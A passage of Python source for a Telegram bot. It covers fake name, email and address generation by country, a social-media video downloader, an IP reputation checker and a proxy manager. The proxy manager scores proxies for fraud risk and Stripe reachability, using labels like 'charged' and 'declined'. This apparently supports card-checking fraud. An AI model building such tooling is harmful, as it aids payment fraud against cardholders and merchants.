    'nz': ('en_NZ', '🇳🇿', 'New Zealand'), 'new zealand': ('en_NZ', '🇳🇿', 'New Zealand'),
    # South America
    'br': ('pt_BR', '🇧🇷', 'Brazil'), 'brazil': ('pt_BR', '🇧🇷', 'Brazil'),
    'ar': ('es_AR', '🇦🇷', 'Argentina'), 'argentina': ('es_AR', '🇦🇷', 'Argentina'),
    'cl': ('es_CL', '🇨🇱', 'Chile'), 'chile': ('es_CL', '🇨🇱', 'Chile'),
    'co': ('es_CO', '🇨🇴', 'Colombia'), 'colombia': ('es_CO', '🇨🇴', 'Colombia'),
    've': ('es_VE', '🇻🇪', 'Venezuela'), 'venezuela': ('es_VE', '🇻🇪', 'Venezuela'),
    'pe': ('es_PE', '🇵🇪', 'Peru'), 'peru': ('es_PE', '🇵🇪', 'Peru'),
    # Africa
    'za': ('en_ZA', '🇿🇦', 'South Africa'), 'south africa': ('en_ZA', '🇿🇦', 'South Africa'),
    'ng': ('en_NG', '🇳🇬', 'Nigeria'), 'nigeria': ('en_NG', '🇳🇬', 'Nigeria'),
    'ke': ('en_KE', '🇰🇪', 'Kenya'), 'kenya': ('en_KE', '🇰🇪', 'Kenya'),
}

@require_approval
async def fake_address_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate fake address by country using Faker library"""
    import asyncio
    from faker import Faker
    user = update.effective_user
    
    locale_info = None
    if context.args:
        country_input = ' '.join(context.args).lower().strip()
        locale_info = FAKER_LOCALES.get(country_input)
        
        if not locale_info:
            unique_countries = {}
            for key, val in FAKER_LOCALES.items():
                unique_countries[val[2]] = f"{val[1]} {val[2]}"
            country_list = sorted(unique_countries.values())
            sample = ", ".join(country_list[:15]) + "..."
            
            await update.message.reply_text(
                f"❌ <b>Country not found:</b> {country_input}\n\n"
                f"<b>50+ countries supported!</b>\n"
                f"Examples: {sample}\n\n"
                f"<b>Usage:</b> <code>/fake us</code>, <code>/fake dubai</code>, <code>/fake japan</code>",
                parse_mode=ParseMode.HTML
            )
            return
    else:
        locale_info = ('en_US', '🇺🇸', 'United States')
    
    loading_msg = await update.message.reply_text(ae("🔄 Generating fake address..."))
    
    try:
        loop = asyncio.get_running_loop()
        locale, flag, country_name = locale_info
        
        def generate_with_faker():
            fake = Faker(locale)
            return {
                'name': fake.name(),
                'email': fake.email(),
                'street': fake.street_address(),
                'city': fake.city(),
                'state': getattr(fake, 'state', lambda: fake.city)() if hasattr(fake, 'state') else '',
                'postcode': fake.postcode(),
            }
        
        data = await loop.run_in_executor(None, generate_with_faker)
        
        city_state = f"{data['city']}, {data['state']}".strip(', ') if data['state'] else data['city']
        
        message = f"""✅ 𝗙𝗮𝗸𝗲 𝗜𝗻𝗳𝗼 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱

𝗡𝗮𝗺𝗲: {data['name']}
𝗠𝗮𝗶𝗹: {data['email']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {flag} {country_name}
𝗦𝘁𝗿𝗲𝗲𝘁: {data['street']}
𝗔𝗱𝗱𝗿𝗲𝘀𝘀: {city_state}
𝗭𝗶𝗽𝗰𝗼𝗱𝗲: {data['postcode']}

𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"""

        try: await loading_msg.delete()
        except Exception: pass
        await _reply_with_gif(update.message, "welcome", message)
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# SOCIAL MEDIA VIDEO DOWNLOADER
# ============================================================================

from modules.downloader import download_media, get_available_qualities, upload_to_filehost, get_platform, get_platform_emoji, format_duration, SUPPORTED_PLATFORMS
from modules import pyro_uploader
from modules.user_config import get_delivery_pref, set_delivery_pref
import secrets as _py_secrets

@require_approval
async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Download videos from social media platforms"""
    user = update.effective_user

    if not context.args:
        await update.message.reply_text(
            f"🎬 <b>Universal Video Downloader</b>\n\n"
            f"<b>Usage:</b>\n"
            f"<code>/download [url]</code> — Pick quality then download\n"
            f"<code>/download [url] audio</code> — Extract audio only (MP3)\n\n"
            f"<b>Works with 1500+ sites</b>, including:\n"
            f"📺 YouTube · 🎵 TikTok · 📸 Instagram · 🐦 Twitter / X\n"
            f"🔴 Reddit · 🎬 Vimeo · 💜 Twitch · 📌 Pinterest\n"
            f"📘 Facebook · 👻 Snapchat · 🧵 Threads · 🎧 SoundCloud\n"
            f"📹 Dailymotion · plus most adult sites and any direct .mp4 link.\n\n"
            f"<b>Examples:</b>\n"
            f"<code>/download https://youtu.be/...</code>\n"
            f"<code>/download https://tiktok.com/... audio</code>\n"
            f"<code>/download https://twitter.com/...</code>\n\n"
            f"<i>Note: Instagram often requires login from cloud servers — if it fails, the post may be private or rate-limited. YouTube / TikTok / Twitter / Reddit are the most reliable.</i>\n\n"
            f"Use /dlpref to set how big files (&gt;49MB) are delivered.",
            parse_mode=ParseMode.HTML
        )
        return

    url = context.args[0]
    audio_only = len(context.args) > 1 and context.args[1].lower() in ['audio', 'mp3', 'music']

    platform = get_platform(url)
    emoji = get_platform_emoji(platform)

    # If audio-only requested, skip quality picker and download immediately
    if audio_only:
        loading_msg = await update.message.reply_text(
            f"{emoji} <b>Extracting audio from {platform.title()}...</b>\n\n⏳ Please wait...",
            parse_mode=ParseMode.HTML
        )
        try:
            result, downloader = await download_media(url, audio_only=True)
            await _send_download_result(update, context, loading_msg, result, downloader, platform, emoji)
        except Exception as e:
            await loading_msg.edit_text(f"❌ <b>Error</b>\n\n{str(e)[:200]}", parse_mode=ParseMode.HTML)
        return

    # Fetch available qualities
    analyzing_msg = await update.message.reply_text(
        f"{emoji} <b>Analyzing {platform.title()} link...</b>\n\n🔍 Fetching available qualities...",
        parse_mode=ParseMode.HTML
    )

    try:
        qualities = await get_available_qualities(url)
    except Exception:
        qualities = []

    # Store URL in bot_data keyed by a per-request token so multiple parallel
    # /download calls from the same user don't clobber each other.
    qtoken = _py_secrets.token_hex(6)
    context.bot_data[f"dlurl_{user.id}_{qtoken}"] = url

    if not qualities:
        # Could not fetch quality list — show simple options
        qualities = [
            {"label": "📹 Best Quality", "value": "best"},
            {"label": "📹 720p", "value": "720"},
            {"label": "📹 480p", "value": "480"},
            {"label": "📹 360p", "value": "360"},
            {"label": "🎵 Audio only (MP3)", "value": "audio"},
        ]

    # Build inline keyboard — 2 buttons per row
    buttons = []
    row = []
    for i, q in enumerate(qualities):
        row.append(InlineKeyboardButton(q["label"], callback_data=f"dlq_{user.id}_{qtoken}_{q['value']}"))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data=f"dlq_{user.id}_{qtoken}_cancel")])

    await analyzing_msg.edit_text(
        f"{emoji} <b>{platform.title()} — Choose Quality</b>\n\n"
        f"🔗 <code>{url[:60]}{'...' if len(url) > 60 else ''}</code>\n\n"
        f"Select the quality you want to download:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(buttons)
    )


async def _send_download_result(update, context, loading_msg, result, downloader, platform, emoji):
    """Shared helper: send the downloaded file to the user."""
    from telegram import InputMediaPhoto, InputMediaVideo

    if not result["success"]:
        await loading_msg.edit_text(
            f"❌ <b>Download Failed</b>\n\n"
            f"<b>Platform:</b> {emoji} {platform.title()}\n"
            f"<b>Error:</b> {result['error']}",
            parse_mode=ParseMode.HTML
        )
        return

    file_path = result["file_path"]
    file_size = os.path.getsize(file_path) / (1024 * 1024)

    if file_size > 49 and not file_path.endswith((".jpg", ".jpeg", ".png", ".mp3", ".m4a")):
        user = update.effective_user
        pref = get_delivery_pref(user.id) if user else "ask"
        direct_available = pyro_uploader.is_configured()

        # Auto-route based on saved preference
        if pref == "link":
            await _deliver_via_link(loading_msg, result, downloader, platform, emoji, file_path, file_size)
            return
        if pref == "direct" and direct_available:
            await _deliver_via_direct(update, loading_msg, result, downloader, platform, emoji, file_path, file_size)
            return
        if pref == "direct" and not direct_available:
            # Direct preference but not configured → fall back to link
            await _deliver_via_link(loading_msg, result, downloader, platform, emoji, file_path, file_size)
            return

        # pref == "ask" → show the choice keyboard
        # token_hex never contains '_', so split("_", 2) parses cleanly
        token = _py_secrets.token_hex(8)
        session_key = f"dldel_{token}"
        context.bot_data[session_key] = {
            "user_id": user.id if user else 0,
            "file_path": file_path,
            "file_size": file_size,
            "platform": platform,
            "emoji": emoji,
            "title": result.get("title") or "Video",
            "duration": result.get("duration"),
            "downloader": downloader,
            "chat_id": update.effective_chat.id if update.effective_chat else None,
            "created_at": time.time(),
        }
        # Auto-expire after 30 minutes: drop the bot_data entry, delete the
        # downloaded file, and let the user know the prompt is dead.
        async def _expire_dldel_session(key=session_key, msg=loading_msg):
            try:
                await asyncio.sleep(1800)
                stale = context.bot_data.pop(key, None)
                if not stale:
                    return  # already consumed
                stale_path = stale.get("file_path")
                stale_dl = stale.get("downloader")
                if stale_dl:
                    try:
                        stale_dl.cleanup()
                    except Exception:
                        pass
                elif stale_path and os.path.exists(stale_path):
                    try:
                        os.remove(stale_path)
                    except Exception:
                        pass
                try:
                    await msg.edit_text(
                        "⌛ <b>Download choice expired</b>\n\nThe file was discarded. Please run /download again.",
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass
            except asyncio.CancelledError:
                pass
        asyncio.create_task(_expire_dldel_session())

        buttons = []
        if direct_available:
            buttons.append([
                InlineKeyboardButton("📤 Send Directly in Chat", callback_data=f"dldel_{token}_direct"),
            ])
        buttons.append([
            InlineKeyboardButton("🔗 Get Download Link", callback_data=f"dldel_{token}_link"),
        ])
        buttons.append([
            InlineKeyboardButton("❌ Cancel", callback_data=f"dldel_{token}_cancel"),
        ])

        info_line = (
            "📤 <b>Send Directly</b> — file appears natively in chat (up to 2GB), with thumbnail and streaming\n"
            "🔗 <b>Get Link</b> — uploads to a free file host and sends you the URL"
        ) if direct_available else (
            "🔗 <b>Get Link</b> — uploads to a free file host and sends you the URL\n"
            "<i>(Direct send requires TG_API_ID / TG_API_HASH to be configured.)</i>"
        )

        await loading_msg.edit_text(
            f"{emoji} <b>{platform.title()} — {result.get('title', 'Video')[:60]}</b>\n\n"
            f"📦 File is <b>{file_size:.1f}MB</b> — over Telegram's 49MB bot limit.\n\n"
            f"How would you like to receive it?\n\n"
            f"{info_line}\n\n"
            f"<i>Tip: use /dlpref to set a default and skip this prompt next time.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
        return

    await loading_msg.edit_text(f"📤 <b>Uploading to Telegram...</b>", parse_mode=ParseMode.HTML)

    duration_text = format_duration(result["duration"]) if result["duration"] else "Unknown"
    caption = (
        f"{emoji} <b>{platform.title()}</b>\n\n"
        f"📌 <b>Title:</b> {result['title']}\n"
        f"⏱ <b>Duration:</b> {duration_text}\n"
        f"📦 <b>Size:</b> {file_size:.1f}MB\n\n"
        f"<i>Downloaded by @Onichanbabybot</i>"
    )

    media_type = result.get("type", "video")
    files = result.get("files")
    audio_path = result.get("audio_path")
    audio_only = result.get("is_audio", False)
    target = update.message if update.message else update.effective_message

    if media_type == "picker" and files and len(files) > 1:
        media_group = []
        for i, item in enumerate(files[:10]):
            item_path = item["path"]
            item_type = item.get("type", "photo")
            if os.path.getsize(item_path) / (1024 * 1024) > 50:
                continue
            cap = caption if i == 0 else None
            if item_type == "video":
                media_group.append(InputMediaVideo(open(item_path, "rb"), caption=cap, parse_mode=ParseMode.HTML if cap else None, supports_streaming=True))
            else:
                media_group.append(InputMediaPhoto(open(item_path, "rb"), caption=cap, parse_mode=ParseMode.HTML if cap else None))
        if media_group:
            await target.reply_media_group(media=media_group)
        if audio_path and os.path.exists(audio_path) and os.path.getsize(audio_path) > 1000:
            with open(audio_path, "rb") as af:
                await target.reply_audio(audio=af, caption=f"🎵 <b>Original Audio</b>\n<i>Downloaded by @Onichanbabybot</i>", parse_mode=ParseMode.HTML, title=(result["title"] or "Audio")[:64])
    else:
        with open(file_path, "rb") as f:
            if audio_only:
                await target.reply_audio(audio=f, caption=caption, parse_mode=ParseMode.HTML, title=(result["title"] or "Audio")[:64])
            elif file_path.endswith((".jpg", ".jpeg", ".png")):
                await target.reply_photo(photo=f, caption=caption, parse_mode=ParseMode.HTML)
                if audio_path and os.path.exists(audio_path) and os.path.getsize(audio_path) > 1000:
                    with open(audio_path, "rb") as af:
                        await target.reply_audio(audio=af, caption=f"🎵 <b>Original Audio</b>\n<i>Downloaded by @Onichanbabybot</i>", parse_mode=ParseMode.HTML, title=(result["title"] or "Audio")[:64])
            else:
                await target.reply_video(video=f, caption=caption, parse_mode=ParseMode.HTML, supports_streaming=True)

    await loading_msg.delete()
    downloader.cleanup()


async def download_quality_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle quality selection for the downloader."""
    query = update.callback_query
    await query.answer()

    data = query.data  # dlq_{user_id}_{qtoken}_{quality}
    parts = data.split("_", 3)
    if len(parts) < 4:
        # Backward compatibility with old buttons (dlq_{user_id}_{quality})
        legacy = data.split("_", 2)
        if len(legacy) == 3:
            _, uid_str, quality = legacy
            qtoken = None
        else:
            return
    else:
        _, uid_str, qtoken, quality = parts

    user = update.effective_user
    if str(user.id) != uid_str:
        await query.answer("This isn't your download session.", show_alert=True)
        return

    url_key = f"dlurl_{user.id}_{qtoken}" if qtoken else f"dlurl_{user.id}"

    if quality == "cancel":
        await query.edit_message_text("❌ Download cancelled.")
        context.bot_data.pop(url_key, None)
        return

    url = context.bot_data.get(url_key)
    if not url:
        await query.edit_message_text("❌ Session expired. Please send /download again.")
        return

    audio_only = quality == "audio"
    platform = get_platform(url)
    emoji = get_platform_emoji(platform)
    quality_label = "Audio (MP3)" if audio_only else (f"{quality}p" if quality.isdigit() else "Best")

    await query.edit_message_text(
        f"{emoji} <b>Downloading {platform.title()} — {quality_label}</b>\n\n⏳ Please wait...",
        parse_mode=ParseMode.HTML
    )

    try:
        result, downloader = await download_media(url, audio_only=audio_only, quality=quality)
        await _send_download_result(update, context, query.message, result, downloader, platform, emoji)
    except Exception as e:
        await query.message.edit_text(f"❌ <b>Error</b>\n\n{str(e)[:200]}", parse_mode=ParseMode.HTML)
    finally:
        context.bot_data.pop(url_key, None)


# ── Large-file delivery helpers ─────────────────────────────────────────────

async def _deliver_via_link(loading_msg, result, downloader, platform, emoji, file_path, file_size):
    """Upload the file to a free file host and reply with the URL."""
    await loading_msg.edit_text(
        f"📁 <b>File is {file_size:.1f}MB — uploading to file host...</b>\n\n"
        f"⏳ This may take a minute depending on size.",
        parse_mode=ParseMode.HTML
    )
    host_url = await upload_to_filehost(file_path)
    if host_url:
        duration_text = format_duration(result["duration"]) if result.get("duration") else "Unknown"
        await loading_msg.edit_text(
            f"{emoji} <b>{platform.title()}</b>\n\n"
            f"📌 <b>Title:</b> {result.get('title', 'Video')}\n"
            f"⏱ <b>Duration:</b> {duration_text}\n"
            f"📦 <b>Size:</b> {file_size:.1f}MB\n\n"
            f"🔗 <b>Download Link:</b>\n{host_url}\n\n"
            f"<i>Hosted on gofile.io / catbox.moe • Downloaded by @Onichanbabybot</i>",
            parse_mode=ParseMode.HTML
        )
    else:
        await loading_msg.edit_text(
            f"❌ <b>Upload Failed</b>\n\n"
            f"File is {file_size:.1f}MB and could not be uploaded to any file host.\n"
            f"Please try selecting a lower quality.",
            parse_mode=ParseMode.HTML
        )
    if downloader:
        downloader.cleanup()


async def _deliver_via_direct(update, loading_msg, result, downloader, platform, emoji, file_path, file_size):
    """Send the file natively in chat via Pyrogram (MTProto, up to 2GB)."""
    chat_id = update.effective_chat.id if update.effective_chat else None
    if chat_id is None:
        await loading_msg.edit_text("❌ Could not determine chat for direct upload.")
        if downloader:
            downloader.cleanup()
        return

    await loading_msg.edit_text(
        f"📤 <b>Sending {file_size:.1f}MB directly...</b>\n\n"
        f"⏳ Uploading via MTProto — this can take a minute for large files.",
        parse_mode=ParseMode.HTML
    )

    duration_text = format_duration(result["duration"]) if result.get("duration") else "Unknown"
    caption = (
        f"{emoji} <b>{platform.title()}</b>\n\n"
        f"📌 <b>Title:</b> {result.get('title', 'Video')}\n"
        f"⏱ <b>Duration:</b> {duration_text}\n"
        f"📦 <b>Size:</b> {file_size:.1f}MB\n\n"
        f"<i>Downloaded by @Onichanbabybot</i>"
    )

    ok = await pyro_uploader.send_video_direct(
        chat_id=chat_id,
        file_path=file_path,
        caption=caption,
        duration=result.get("duration"),
        title=result.get("title"),
    )

    if ok:
        try:
            await loading_msg.delete()
        except Exception:
            pass
    else:
        # Fallback: try as document
        ok2 = await pyro_uploader.send_document_direct(
            chat_id=chat_id, file_path=file_path, caption=caption
        )
        if ok2:
            try:
                await loading_msg.delete()
            except Exception:
                pass
        else:
            # Final fallback: file host link
            await loading_msg.edit_text(
                "⚠️ Direct upload failed. Falling back to file host link...",
                parse_mode=ParseMode.HTML
            )
            await _deliver_via_link(loading_msg, result, None, platform, emoji, file_path, file_size)
            if downloader:
                downloader.cleanup()
            return

    if downloader:
        downloader.cleanup()


async def download_delivery_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the link/direct/cancel choice for large files."""
    query = update.callback_query
    await query.answer()

    data = query.data  # dldel_{token}_{action}
    parts = data.split("_", 2)
    if len(parts) != 3:
        return
    _, token, action = parts
    if action not in ("link", "direct", "cancel"):
        return

    session = context.bot_data.get(f"dldel_{token}")
    if not session:
        await query.edit_message_text("❌ Session expired. Please run /download again.")
        return

    user = update.effective_user
    if user and session.get("user_id") and user.id != session["user_id"]:
        await query.answer("This isn't your download session.", show_alert=True)
        return

    file_path = session["file_path"]
    file_size = session["file_size"]
    platform = session["platform"]
    emoji = session["emoji"]
    downloader = session.get("downloader")
    fake_result = {
        "title": session.get("title", "Video"),
        "duration": session.get("duration"),
        "success": True,
        "file_path": file_path,
    }

    # Pop session up-front so a stalled upload can't double-fire
    context.bot_data.pop(f"dldel_{token}", None)

    if action == "cancel":
        await query.edit_message_text("❌ Cancelled. File discarded.")
        if downloader:
            downloader.cleanup()
        return

    if action == "link":
        await _deliver_via_link(query.message, fake_result, downloader, platform, emoji, file_path, file_size)
    elif action == "direct":
        if not pyro_uploader.is_configured():
            await query.message.edit_text(
                "⚠️ Direct send isn't configured. Falling back to file host link...",
                parse_mode=ParseMode.HTML,
            )
            await _deliver_via_link(query.message, fake_result, downloader, platform, emoji, file_path, file_size)
        else:
            await _deliver_via_direct(update, query.message, fake_result, downloader, platform, emoji, file_path, file_size)


@require_approval
async def dlpref_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set or view the default delivery method for large files."""
    user = update.effective_user
    if not user:
        return

    arg = (context.args[0].lower() if context.args else "").strip()

    if arg in ("ask", "link", "direct"):
        if arg == "direct" and not pyro_uploader.is_configured():
            await update.message.reply_text(
                "⚠️ <b>Direct send isn't configured</b>\n\n"
                "The bot owner needs to set <code>TG_API_ID</code> and "
                "<code>TG_API_HASH</code> from https://my.telegram.org for this option to work.",
                parse_mode=ParseMode.HTML,
            )
            return
        set_delivery_pref(user.id, arg)
        labels = {
            "ask": "Ask every time",
            "link": "Always send a download link",
            "direct": "Always send the file directly in chat",
        }
        await update.message.reply_text(
            f"✅ <b>Delivery preference saved</b>\n\n"
            f"Default for files over 49MB: <b>{labels[arg]}</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    current = get_delivery_pref(user.id)
    direct_status = "✅ Configured" if pyro_uploader.is_configured() else "❌ Not configured (needs TG_API_ID / TG_API_HASH)"
    await update.message.reply_text(
        "⚙️ <b>Large-File Delivery Preference</b>\n\n"
        f"Current setting: <b>{current}</b>\n"
        f"Direct send: {direct_status}\n\n"
        "<b>Usage:</b>\n"
        "<code>/dlpref ask</code> — choose every time (default)\n"
        "<code>/dlpref link</code> — always send a download link\n"
        "<code>/dlpref direct</code> — always send the file directly in chat (up to 2GB)",
        parse_mode=ParseMode.HTML,
    )


# ============================================================================
# IP REPUTATION CHECKER
# ============================================================================

from modules.ip_checker import full_ip_check, format_ip_report, is_valid_ip

@require_approval
async def ip_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check IP reputation and risk score"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>IP Reputation Checker</b>\n\n"
            "<b>Usage:</b> <code>/ip &lt;ip_address&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/ip 8.8.8.8</code>\n"
            "<code>/ip 1.1.1.1</code>\n\n"
            "<i>Checks IP against multiple threat intelligence sources</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    ip = context.args[0].strip()
    
    if not is_valid_ip(ip):
        await update.message.reply_text(
            "❌ <b>Invalid IP Address</b>\n\n"
            f"<code>{ip}</code> is not a valid IPv4 address.\n\n"
            "<b>Format:</b> <code>xxx.xxx.xxx.xxx</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await update.message.reply_text(
        f"🔍 <b>Scanning IP Address...</b>\n\n"
        f"📍 Target: <code>{ip}</code>\n"
        f"⏳ Checking threat databases...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        results = await full_ip_check(ip)
        report = format_ip_report(results)
        try: await loading_msg.delete()
        except Exception: pass
        await _reply_with_gif(update.message, "welcome", report)
        
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error checking IP</b>\n\n{str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# PROXY CHECKER
# ============================================================================

from modules.proxy_checker import (
    check_single_proxy, check_proxies, format_proxy_result, format_mass_results,
    test_proxy, test_proxies_batch, check_ip_info, parse_proxy, get_flag_emoji
)

@require_approval
async def proxy_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check proxy status, country, and details"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>Proxy Checker</b>\n\n"
            "<b>Usage:</b> <code>/ckproxy &lt;proxy&gt;</code>\n\n"
            "<b>Supported Formats:</b>\n"
            "• <code>host:port</code>\n"
            "• <code>host:port:user:pass</code>\n"
            "• <code>user:pass@host:port</code>\n"
            "• <code>http://host:port</code>\n"
            "• <code>socks5://host:port</code>\n\n"
            "<b>Examples:</b>\n"
            "<code>/ckproxy 8.8.8.8:8080</code>\n"
            "<code>/ckproxy proxy.com:3128:user:pass</code>\n\n"
            "<b>Mass Check:</b>\n"
            "Send multiple proxies (one per line) or reply to a file",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if multiple proxies
    text = ' '.join(context.args)
    proxies = [p.strip() for p in text.replace(',', '\n').split('\n') if p.strip()]
    
    if len(proxies) == 1:
        # Single proxy check
        proxy = proxies[0]
        loading_msg = await update.message.reply_text(
            f"🔍 <b>Checking Proxy...</b>\n\n"
            f"📡 Proxy: <code>{proxy}</code>\n"
            f"⏳ Testing connection...",
            parse_mode=ParseMode.HTML
        )
        
        try:
            result = await check_single_proxy(proxy, timeout=15)
            report = format_proxy_result(result)
            
            await loading_msg.edit_text(
                report,
                parse_mode=ParseMode.HTML
            )
            
        except Exception as e:
            await loading_msg.edit_text(
                f"❌ <b>Error checking proxy</b>\n\n{str(e)[:200]}",
                parse_mode=ParseMode.HTML
            )
    else:
        # Mass proxy check (limit to 50)
        if len(proxies) > 50:
            proxies = proxies[:50]
            note = "\n<i>Note: Limited to first 50 proxies</i>"
        else:
            note = ""
        
        loading_msg = await update.message.reply_text(
            f"🔍 <b>Mass Proxy Check</b>\n\n"
            f"📊 Checking {len(proxies)} proxies...\n"
            f"⏳ Please wait...{note}",
            parse_mode=ParseMode.HTML
        )
        
        try:
            results = await check_proxies(proxies, timeout=15, max_concurrent=10)
            report = format_mass_results(results)
            
            await loading_msg.edit_text(
                report,
                parse_mode=ParseMode.HTML
            )
            
        except Exception as e:
            await loading_msg.edit_text(
                f"❌ <b>Error checking proxies</b>\n\n{str(e)[:200]}",
                parse_mode=ParseMode.HTML
            )

# ============================================================================
# UNIFIED PROXY MANAGER — /proxy add/del/clear/test/list + check-only
# ============================================================================

@require_approval
async def unified_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message
    uid = user.id

    if not is_premium(uid):
        await message.reply_text(f"{EMOJI['lock']} <b>Premium Feature</b>\n\nProxy management requires premium.", parse_mode=ParseMode.HTML)
        return

    args_text = " ".join(context.args).strip() if context.args else ""

    if not args_text:
        await _proxy_show_list(message, uid)
        return

    sub, _, rest = args_text.partition(" ")
    sub = sub.lower()

    if sub == "add":
        await _proxy_add(message, uid, rest.strip())
    elif sub in ("del", "rm", "remove"):
        await _proxy_del(message, uid, rest.strip())
    elif sub == "clear":
        await _proxy_clear(message, uid)
    elif sub in ("test", "check"):
        await _proxy_test_all(message, uid)
    elif sub == "list":
        await _proxy_show_list(message, uid)
    elif sub == "mode":
        await _proxy_toggle_mode(message, uid, rest.strip())
    else:
        await _proxy_check_only(message, uid, args_text)


async def _proxy_show_list(message, uid):
    user_proxies = ah_get_user_proxies(uid)
    mode = get_user_proxy_mode(uid)
    mode_text = f"{EMOJI['charged']} Own Proxy" if mode == "own" else f"{EMOJI['plug']} System Proxy"

    if user_proxies:
        lines = "\n".join(f"<code>{p}</code>" for p in user_proxies[:15])
        if len(user_proxies) > 15:
            lines += f"\n<i>... and {len(user_proxies) - 15} more</i>"
    else:
        lines = "<i>None added</i>"

    text = (
        f"💜 <b>ONICHAN • PROXY</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ <b>Mode</b> : {mode_text}\n"
        f"📊 <b>Saved</b> : {len(user_proxies)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{lines}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"/proxy add · /proxy del · /proxy clear\n"
        f"/proxy test · /proxy mode own|system"
    )
    await message.reply_text(text, parse_mode=ParseMode.HTML)


async def _proxy_add(message, uid, text):
    if not text:
        await message.reply_text("Usage: <code>/proxy add host:port:user:pass</code>", parse_mode=ParseMode.HTML)
        return

    lines = [l.strip() for l in text.split("\n") if l.strip()]
    if not lines:
        await message.reply_text(f"{EMOJI['declined']} No proxies provided.", parse_mode=ParseMode.HTML)
        return

    status_msg = await message.reply_text(
        f"{EMOJI['hitting']} Testing {len(lines)} proxy(s)...\nChecking IP, fraud score, and Stripe...",
        parse_mode=ParseMode.HTML
    )

    results = await test_proxies_batch(lines, concurrency=10)
    alive, dead = [], []
    for r in results:
        if r["alive"]:
            ah_add_user_proxy(uid, r["proxy"])
            alive.append(r)
        else:
            dead.append(r)

    alive_blocks = []
    for r in alive[:5]:
        stripe_s = EMOJI["charged"] if r["stripe"] else EMOJI["declined"]
        alive_blocks.append(
            f"{EMOJI['charged']} <code>{r['proxy']}</code>\n"
            f"   IP ~ <code>{r['ip']}</code> | {r['country']} | <code>{r['ms']}ms</code>\n"
            f"   Stripe ~ {stripe_s}"
        )
    dead_lines = "\n".join(f"{EMOJI['declined']} <code>{r['proxy']}</code> — {r['error']}" for r in dead[:3])
    if len(alive) > 5:
        alive_blocks.append(f"<i>... and {len(alive)-5} more added</i>")

    output = (
        f"💜 <b>PROXY • ADD</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Alive : {len(alive)}/{len(lines)}\n"
        f"❌ Dead  : {len(dead)}/{len(lines)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )
    if alive_blocks:
        output += "<b>Added:</b>\n" + "\n\n".join(alive_blocks) + "\n"
    if dead_lines:
        output += f"\n<b>Failed:</b>\n{dead_lines}"

    if len(output) > 4096:
        output = output[:4090] + "\n<i>...</i>"
    await status_msg.edit_text(output, parse_mode=ParseMode.HTML)


async def _proxy_del(message, uid, proxy):
    if not proxy:
        await message.reply_text("Usage: <code>/proxy del host:port:user:pass</code>", parse_mode=ParseMode.HTML)
        return
    ah_remove_user_proxy(uid, proxy)
    await message.reply_text(f"{EMOJI['trash']} Removed: <code>{proxy}</code>", parse_mode=ParseMode.HTML)


async def _proxy_clear(message, uid):
    user_proxies = ah_get_user_proxies(uid)
    count = len(user_proxies)
    ah_remove_user_proxy(uid, "all")
    await message.reply_text(f"{EMOJI['trash']} Cleared {count} proxy(s).", parse_mode=ParseMode.HTML)


async def _proxy_test_all(message, uid):
    proxies = ah_get_user_proxies(uid)
    if not proxies:
        await message.reply_text(f"{EMOJI['declined']} No proxies to test. Add one with <code>/proxy add</code>.", parse_mode=ParseMode.HTML)
        return

    status_msg = await message.reply_text(
        f"{EMOJI['hitting']} Testing {len(proxies)} proxy(s)...\nChecking IP, fraud score, and Stripe...",
        parse_mode=ParseMode.HTML
    )

    results = await test_proxies_batch(proxies, concurrency=10)
    alive = [r for r in results if r["alive"]]
    dead = [r for r in results if not r["alive"]]
    stripe_ok = [r for r in alive if r["stripe"]]

    blocks = []
    for r in results[:10]:
        if r["alive"]:
            stripe_status = f"{EMOJI['charged']} YES" if r["stripe"] else f"{EMOJI['declined']} NO"
            stripe_lat = f" ({r['stripe_ms']}ms)" if r.get("stripe_ms") else ""

            fs = r.get("fraud_score")
            if fs is not None:
                if fs <= 20:
                    fraud_line = f"{EMOJI['charged']} <code>{fs}/100</code> (Clean)"
                elif fs <= 50:
                    fraud_line = f"{EMOJI['error']} <code>{fs}/100</code> (Medium)"
                elif fs <= 75:
                    fraud_line = f"{EMOJI['risky']} <code>{fs}/100</code> (Risky)"
                else:
                    fraud_line = f"{EMOJI['danger']} <code>{fs}/100</code> (High Risk)"
            else:
                fraud_line = "─"

            proxy_flag = ""
            if r.get("is_proxy") == "yes":
                proxy_flag += " [Proxy]"
            if r.get("is_vpn") == "yes":
                proxy_flag += " [VPN]"

            blocks.append(
